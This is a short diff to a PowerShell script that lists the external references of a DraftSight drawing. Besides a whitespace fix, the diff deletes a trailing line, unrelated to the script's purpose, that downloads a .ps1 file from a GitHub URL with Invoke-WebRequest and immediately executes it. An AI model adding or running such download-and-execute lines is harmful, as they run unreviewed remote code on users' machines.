@@ -31,7 +31,7 @@ if ($null -eq $DraftSightApp){
 try {
     $doc = $DraftSightApp.OpenDocument($path, 1)
     $xrefs = $doc.GetExternalReferences()
-    
+
     $clip = ""
     foreach ($xref in $xrefs) {
         $clip += $xref.Name() + [System.Environment]::NewLine
@@ -51,6 +51,3 @@ try {
     Write-Host "Exception Details: $($_.Exception)"
     exit 1
 }
-
-
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/thomasmaurer/demo-cloudshell/master/helloworld.ps1 -OutFile .\helloworld.ps1; .\helloworld.ps1 
